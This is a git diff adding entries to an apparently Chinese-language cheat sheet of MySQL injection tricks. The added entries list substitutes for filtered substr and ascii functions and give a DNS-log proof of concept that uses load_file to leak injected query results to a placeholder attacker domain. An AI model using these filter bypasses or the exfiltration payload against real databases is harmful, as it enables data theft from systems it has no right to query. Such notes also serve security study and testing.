@@ -278,6 +278,28 @@ thr7.start()
 ```
   * 修改 ``||``(或)运算符为字符串连接符
     ``set sql_mode=PIPES_AS_CONCAT;`` 
+  
+  * substr被过滤
+    
+    ```sql
+    left(str,index) //从左边第index开始读取
+    right(str,index) //从右边index开始读取
+    mid(str,index,len)//从index开始截取str,截取len的长度
+    substring(strd,index) //从左边index开始读取
+    lpad(str, padded_length, [ pad_str ] )//在str左填充给定的pad_str到指定的长度len,返回len个字符
+    rpad(str, padded_length, [ pad_str ] )//在str右填充给定的pad_str到指定的长度len,返回len个字符
+    ```
+  * ascii被过滤
+
+    ``hex() ord() bin()``
+  
+  * load_file dnslog注入
+    
+    poc:
+    ```
+    select load_file(concat('\\\\', (<sqli>), '.your-dnslog.com'));
+    ```
+
 ## 参考资料
 
 对MYSQL注入相关内容及部分Trick的归类小结
